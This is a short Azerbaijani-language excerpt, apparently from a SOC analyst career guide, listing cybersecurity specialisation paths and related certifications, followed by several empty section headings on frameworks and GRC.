<p>L1-dən L3-ə qədər: əsaslar → müstəqil təhqiqat/detection → threat hunting/forensika/RE/liderlik. İndi real inkişaf təcrübə, davamlı öyrənmə və ixtisaslaşma ilə davam edir.</p>
<h3>İxtisaslaşma yolları (L3+)</h3>
<ul><li><b>DFIR</b> (forensika/IR) — GCFA, GCFE, GNFA, GREM</li>
<li><b>Threat Hunting</b> — GCTI, eCTHPv2</li><li><b>Detection Engineering</b></li>
<li><b>Malware RE</b> — GREM</li><li><b>Threat Intelligence (CTI)</b> — GCTI</li>
<li><b>Red Team/Offensive</b> (müdafiəni anlamaq üçün) — OSCP, CRTO</li>
<li><b>Cloud Security</b> — cloud detection/forensics</li><li><b>SOC Lead/Management</b></li></ul>
<h3>Sertifikat yolu (ümumi)</h3>

<p>SOC analitik gündəlik işində çərçivə və standartlara istinad edir. Bunları tanımaq müsahibədə və real işdə vacibdir.</p>

<h3>Governance, Risk, Compliance (GRC)</h3>

<h3>Siyasət iyerarxiyası</h3>
